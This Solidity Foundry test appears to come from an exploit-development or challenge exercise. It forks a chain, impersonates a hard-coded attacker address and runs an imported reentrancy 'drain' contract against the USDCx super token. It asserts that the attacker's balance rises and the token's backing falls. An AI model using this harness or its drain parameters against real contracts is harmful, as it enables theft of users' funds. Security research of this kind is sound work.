// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import {Ch5ERC20Drain} from "../exploit/Run.s.sol";

interface IERC20View47 {
    function balanceOf(address account) external view returns (uint256);
}

interface ISuperTokenView47 {
    function getUnderlyingToken() external view returns (address);
}

/// @notice Single-combination validation for the intended live USDCx helper.
contract Attempt47USDCReentry20ProbeTest is Test {
    address internal constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;
    address internal constant USDCX = 0xCAa7349CEA390F89641fe306D93591f87595dc1F;
    address internal constant ROUTER = 0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff;

    uint256 internal constant BOOTSTRAP_NATIVE = 25_000 ether;
    uint256 internal constant REENTRY_COUNT = 20;
    uint256 internal constant MAX_ROUNDS = 1;

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_CH5_SUPERFLUID_V2"));
        vm.deal(ATTACKER, 100_000 ether);
    }

    function test_probe_live_usdc_reentry20() public {
        address underlying = ISuperTokenView47(USDCX).getUnderlyingToken();
        uint256 nativeBefore = ATTACKER.balance;
        uint256 backingBefore = IERC20View47(underlying).balanceOf(USDCX);

        vm.startPrank(ATTACKER);
        Ch5ERC20Drain drain = new Ch5ERC20Drain(USDCX, ROUTER, 640_000_000, address(0));
        (uint256 roundsExecuted, uint256 nativeOut) = drain.executeDrain{value: BOOTSTRAP_NATIVE}(
            MAX_ROUNDS, REENTRY_COUNT
        );
        vm.stopPrank();

        uint256 nativeAfter = ATTACKER.balance;
        uint256 backingAfter = IERC20View47(underlying).balanceOf(USDCX);

        console.log("rounds executed:", roundsExecuted);
        console.log("native out:", nativeOut);
        console.log("native delta:", nativeAfter - nativeBefore);
        console.log("backing before:", backingBefore);
        console.log("backing after:", backingAfter);
        console.log("backing delta:", backingBefore - backingAfter);

        assertGt(roundsExecuted, 0, "no rounds executed");
        assertGt(nativeAfter, nativeBefore, "native delta must be positive");
        assertLt(backingAfter, backingBefore, "backing must decrease");
    }
}
